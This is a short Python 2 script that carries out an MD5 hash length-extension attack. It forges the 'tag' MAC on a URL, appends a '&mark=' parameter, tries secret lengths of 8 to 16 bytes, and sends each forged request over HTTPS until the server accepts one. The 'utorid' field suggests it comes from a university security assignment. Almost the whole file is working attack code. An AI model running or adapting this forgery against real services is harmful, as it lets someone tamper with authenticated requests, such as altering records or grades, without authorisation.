import httplib, urlparse, urllib, sys
from md5p import md5, padding

MARK = '&mark='
TAG = '?tag='
if(__name__ == "__main__"):
    # find url
    url = sys.argv[1]
    
    # find the tag value
    tag = url[(url.find(TAG)+len(TAG)):(url.find('&utorid='))]

    # compute the new md5 hash value
    new_h = md5(state=tag.decode('hex'),count = 512)
    extend = MARK + sys.argv[2] + url[url.find('&utorid='):]
    new_h.update(extend)
    new_tag = new_h.hexdigest()
    
    # find the length of the orignal message aka data
    length_data = len(url[url.find('&utorid='):])
    
    # comput all possible new urls
    for i in range(8, 17):
        #pad = repr(padding((length_data + i) * 8)).replace(r"\x","%")[1:-1]
        pad = urllib.quote(padding((length_data + i) * 8))
        new_url = url[:url.find(TAG)+len(TAG)]+ new_tag + url[
            url.find('&utorid='):] + pad + extend
        
        #parse url
        url_parsed = urlparse.urlparse(new_url)
        
        #open connection
        connection = httplib.HTTPSConnection(url_parsed.hostname)
        
        #issuse request
        connection.request("GET", url_parsed.path + "?" + url_parsed.query)
        
        #get response
        response = connection.getresponse()
        
        #print
        if response.status == 200:
            print response.status
            print response.read()
            break        